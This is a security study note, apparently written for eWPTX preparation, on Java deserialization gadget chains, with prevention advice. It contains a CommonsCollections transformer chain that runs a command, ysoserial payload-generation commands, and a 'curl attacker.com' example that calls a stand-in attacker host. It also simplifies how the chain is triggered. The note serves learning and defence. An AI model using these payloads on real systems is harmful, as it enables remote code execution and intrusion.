2026-02-06 22:00

Status:

Tags: [[eWPTX]] [[Java]] [[Gadgets]] [[Exploitation]]
###### Prerequisites: [[Java Serialization & Deserialization]] [[Insecure Deserialization]]
# Gadgets & Gadget Chains

## Overview

In the context of insecure deserialization exploits, a **gadget** is a property or method that is part of a nested exploit object.

A **gadget chain** is a sequence of gadget calls that leads from the deserialization operation to the execution of malicious code.

---

## What are Gadgets?

Every property or method that is part of a nested exploit object is called a **gadget**.

Gadgets are existing code fragments in the target application or its dependencies that can be abused by an attacker to:

- Execute arbitrary code
- Read/write files
- Establish network connections
- Perform other malicious actions

### The Concept

![[Pics/deserialization/gadget-chain.svg]]

---

## How Gadget Chains Work

### Step 1: Entry Point

The deserialization process calls `readObject()` on the attacker-controlled object.

### Step 2: Chaining

Each gadget invokes the next one through:

- Method calls (e.g., `toString()`, `hashCode()`)
- Reflection
- Dynamic proxies
- Invocation handlers

### Step 3: Payload Execution

The final gadget executes the attacker's payload.

---

## Gadget Libraries

Specific Java libraries have been identified as containing **universal gadgets** used to build serialized exploit objects.

These are called **gadget libraries**.

**Important**: These libraries are **not insecure by design**. They simply contain code that can be abused when insecure deserialization is performed while they are loaded into the classpath.

---

## Notable Gadget Libraries

| Library | Affected Versions | Notes |
|---------|-------------------|-------|
| Apache Commons Collections | 1-6 | Most famous gadget chain |
| Apache Commons Fileupload | 1.3 - 1.3.3 | Known gadget chains |
| Spring Framework | Various | Core framework gadgets |
| Groovy | Various | Dynamic language features |
| Apache BeanUtils | 1.9.2 and earlier | Property manipulation |
| Java Beans | Standard API | Basic gadget operations |
| JRE (Runtime) | Various | Built-in gadgets |
| Hibernate | Various | ORM framework gadgets |
| Jackson-databind | Various | JSON parsing gadgets |

---

## Example: CommonsCollections Gadget Chain

The Apache Commons Collections library contains a transformer mechanism that can be abused:

```
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer(
        "getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}
    ),
    new InvokerTransformer(
        "invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}
    ),
    new InvokerTransformer(
        "exec",
        new Class[]{String.class},
        new Object[]{"calc.exe"}
    )
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```

When this object is deserialized, the chain executes:

```
Runtime.class → getMethod("getRuntime") → invoke() → exec("calc.exe")
```

---

## The Concept Origins

The concept of gadgets was first presented at:

**AppSec California 2015**
**Title**: "Marshalling Pickles: How deserializing objects will ruin your day"
**Speakers**: Chris Frohoff (@frohoff) and Gabriel Lawrence (@gebl)

Reference: https://frohoff.github.io/appseccali-marshalling-pickles/

This talk demonstrated how Java deserialization could be exploited using gadget chains in commonly used libraries.

---

## Automated Exploitation with Ysoserial

**Ysoserial** is a tool that generates malicious serialized payloads using known gadget chains.

It contains modules for various libraries and scenarios:

```bash
# List available gadgets
java -jar ysoserial.jar

# Generate payload using CommonsCollections1
java -jar ysoserial.jar CommonsCollections1 "whoami" > payload.ser

# Generate payload for Spring framework
java -jar ysoserial.jar Spring1 "curl attacker.com" > payload.ser
```

---

## Finding Gadget Chains

### Manual Analysis

1. Identify classes that implement `Serializable`
2. Find `readObject()` implementations
3. Trace method calls (`toString()`, `hashCode()`, getters)
4. Look for "dangerous" operations (reflection, command execution)

### Automated Tools

- **ysoserial**: Generate payloads with known chains
- **GadgetInspector**: Static analysis for finding gadgets
- **marshalsec**: Dynamic testing tool

---

## Prevention Against Gadget Chain Attacks

### 1. Keep Dependencies Updated

Remove or update vulnerable libraries:

```xml
<!-- Use patched versions -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.2</version> <!-- Patched version -->
</dependency>
```

### 2. Class Whitelisting

Only allow specific classes to be deserialized:

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.*;!*"
);
ObjectInputFilter.setFilter(filter);
```

### 3. Use Safe Serialization Formats

Prefer JSON, XML, or other safe formats over Java serialization.

### 4. Remove Unused Libraries

Reduce the attack surface by removing unnecessary dependencies.

### 5. Enable JEP 290 (Java 9+)

Use built-in filtering mechanisms:

```java
class MyFilter implements ObjectInputFilter {
    @Override
    public Status checkInput(FilterInfo filterInfo) {
        if (filterInfo.depth() > 2) {
            return Status.REJECTED;
        }
        // Additional checks...
        return Status.UNDECIDED;
    }
}
```

---

## Key Points

- Gadgets are existing code fragments that can be abused during deserialization
- Gadget chains connect multiple gadgets to achieve malicious goals
- Libraries like Commons Collections contain well-known gadget chains
- Ysoserial is the primary tool for generating gadget-based payloads
- Prevention involves patching, whitelisting, and using safe formats

---

## References

- "Marshalling Pickles" - AppSec CA 2015: https://frohoff.github.io/appseccali-marshalling-pickles/
- ysoserial GitHub: https://github.com/frohoff/ysoserial
- GadgetInspector GitHub: https://github.com/JackOfMostTrades/gadgetinspector
